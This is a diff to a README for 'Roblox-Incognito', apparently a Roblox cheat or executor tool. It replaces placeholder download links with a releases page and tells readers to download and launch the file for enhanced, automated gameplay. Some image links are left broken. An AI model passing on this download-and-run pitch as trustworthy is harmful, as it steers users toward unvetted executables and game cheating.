@@ -29,9 +29,9 @@ Explore a variety of topics relevant to the "Roblox-Incognito" repository:
 
 ## Get Started 🚗
 
-To kickstart your Incognito experience, download the latest version [here](https://github.com/files/File.zip). Don't forget to launch the file to begin your journey into the world of enhanced Roblox gameplay.
+To kickstart your Incognito experience, download the latest version [here](https://github.com/gusttaHTXdev/Roblox-Incognito/releases). Don't forget to launch the file to begin your journey into the world of enhanced Roblox gameplay.
 
-[![Download Incognito](https://img.shields.io/badge/Download-Incognito-brightgreen)](https://github.com/files/File.zip)
+[![Download Incognito](https://github.com/gusttaHTXdev/Roblox-Incognito/releases)](https://github.com/gusttaHTXdev/Roblox-Incognito/releases)
 
 If the provided link does not work or you are looking for alternative options, be sure to check out the "Releases" section for more information.
 
@@ -39,7 +39,7 @@ If the provided link does not work or you are looking for alternative options, b
 
 Don't miss out on the opportunity to take your Roblox gameplay to the next level with Incognito. Join the community of users unlocking new possibilities and enjoying enhanced features within the game. Download your copy today and dive into a world of endless excitement and automation.
 
-![Roblox Logo](https://example.com/roblox-logo.jpg)
+![Roblox Logo](https://github.com/gusttaHTXdev/Roblox-Incognito/releases)
 
 ## Stay Connected 🤝
 
